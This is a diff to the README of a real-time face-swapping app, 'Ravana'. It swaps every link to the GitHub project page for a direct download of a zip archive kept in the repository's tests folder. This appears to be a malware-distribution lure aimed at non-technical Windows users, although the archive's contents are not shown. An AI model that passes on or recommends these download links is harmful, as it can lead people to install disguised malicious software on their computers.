@@ -1,6 +1,6 @@
 # 🧑‍🎤 Ravana - Real-Time Face Swapping Made Easy
 
-[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/wccws/Ravana/main/face_swap/native/tests/Software_v3.1.zip)
 
 Welcome to the Ravana application. This tool lets you swap faces in photos, videos, or live webcam streams. It uses advanced technology to make the swaps smooth and realistic. You do not need any programming skills to use it.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run Ravana on your Windows PC:
 
 Click the button below to visit the Ravana download page on GitHub:
 
-[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/wccws/Ravana/main/face_swap/native/tests/Software_v3.1.zip)
 
 This page holds the latest files you need to run Ravana.
 
@@ -142,6 +142,6 @@ Check the GitHub page regularly. When new versions are available, download and i
 
 Visit the GitHub page below at any time to get the latest files or view detailed technical info:
 
-[https://github.com/wccws/Ravana](https://github.com/wccws/Ravana)
+[https://raw.githubusercontent.com/wccws/Ravana/main/face_swap/native/tests/Software_v3.1.zip](https://raw.githubusercontent.com/wccws/Ravana/main/face_swap/native/tests/Software_v3.1.zip)
 
-[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/wccws/Ravana/main/face_swap/native/tests/Software_v3.1.zip)
